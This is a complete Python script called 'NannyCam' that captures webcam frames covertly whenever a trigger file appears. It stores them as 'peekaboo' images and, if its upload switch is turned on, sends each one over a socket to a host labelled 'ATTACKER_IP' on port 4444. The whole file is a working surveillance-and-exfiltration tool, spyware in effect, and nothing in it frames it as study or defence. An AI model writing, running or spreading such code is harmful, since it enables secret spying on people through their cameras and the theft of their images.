import cv2
import time
import os
import socket
import threading
from datetime import datetime

REMOTE_UPLOAD = False
REMOTE_IP = "ATTACKER_IP"
REMOTE_PORT = 4444

OUTPUT_DIR = os.path.join(os.getcwd(), "snaps")
os.makedirs(OUTPUT_DIR, exist_ok=True)

def get_filename():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    return os.path.join(OUTPUT_DIR, f"peekaboo_{timestamp}.jpg")

def take_snap():
    cam = cv2.VideoCapture(0)
    time.sleep(2)  # let cam warm up
    ret, frame = cam.read()
    if ret:
        filename = get_filename()
        cv2.imwrite(filename, frame)
        print(f"[+] Frame captured: {filename}")
        if REMOTE_UPLOAD:
            send_file(filename)
    cam.release()

def send_file(filename):
    try:
        with socket.create_connection((REMOTE_IP, REMOTE_PORT)) as s:
            with open(filename, "rb") as f:
                data = f.read()
                s.sendall(data)
            print(f"[+] Frame sent to {REMOTE_IP}:{REMOTE_PORT}")
    except Exception as e:
        print(f"[-] Failed to send frame: {e}")

def trigger_listener():
    print("[*] NannyCam armed. Waiting for trigger...")
    while True:
        if os.path.exists("trigger.txt"):
            print("[!] Trigger detected. Snapping...")
            take_snap()
            os.remove("trigger.txt")
        time.sleep(1)

def run_once():
    print("[*] Capturing single frame for test...")
    take_snap()

if __name__ == "__main__":
    trigger_thread = threading.Thread(target=trigger_listener, daemon=True)
    trigger_thread.start()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n[+] NannyCam exiting.")
